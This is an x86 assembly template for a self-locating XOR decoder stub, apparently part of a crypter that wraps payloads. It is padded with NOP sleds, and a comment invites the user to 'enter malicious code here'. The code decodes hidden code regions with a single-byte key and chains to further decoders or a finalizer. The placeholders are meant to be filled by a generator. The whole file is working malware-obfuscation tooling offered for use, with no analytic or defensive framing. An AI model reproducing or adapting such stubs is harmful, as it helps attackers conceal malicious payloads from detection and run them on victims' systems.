global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------

; <IS_LAST>               - is this decoder last in execution order
; <DECODER_KEY>           - decoder key
; <SPARED_CODE_SIZE>      - size of spared code
; <OFFSET_TO_EXILED_CODE> - offset from first byte of spared code to exiled code
; <EXILED_CODE_SIZE>      - size of exiled code
; <OFFSET_TO_FINALIZER>   - offset from first byte of spared code to finalizer

    mov     edi, <IS_LAST>                  ; 1 if last decoder, 0 otherwise
    xor     ebx, ebx                        ; clear registers
    xor     ecx, ecx                        ;
    
    mov     bl,  <DECODER_KEY>              ; decoder key
    mov     ecx, <SPARED_CODE_SIZE>         ; spared code size
    jmp     get_spared_code_addr
    
spared_code_decoder_loop:
    mov     edx, esi                        ; construct encoded byte address
    add     edx, ecx                        ;
    dec     edx                             ;
    xor     byte [edx], bl                  ; decode
    loop    spared_code_decoder_loop        ; loop back
 
    mov     eax, esi                        ; eax = address of first spared code byte
    add     esi, <OFFSET_TO_EXILED_CODE>    ; esi = address of exiled code in last section
    mov     ecx, <EXILED_CODE_SIZE>         ; exiled code size

exiled_code_decoder_loop:
    mov     edx, esi                        ; construct encoded byte address
    add     edx, ecx                        ;
    dec     edx                             ;
    xor     byte [edx], bl                  ; decode
    loop    exiled_code_decoder_loop        ; loop back

    test    edi, edi                        ; check if zero
    jz      next_engine 

    add     eax, <OFFSET_TO_FINALIZER>      ; eax = address of finalizer
    jmp     eax                             ; jump to finalizer
    
pop_spared_code_address:
    pop     esi                             ; pop spared code address
    jmp     spared_code_decoder_loop

get_spared_code_addr:
    call pop_spared_code_address            ; push return address
    
next_engine:

; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop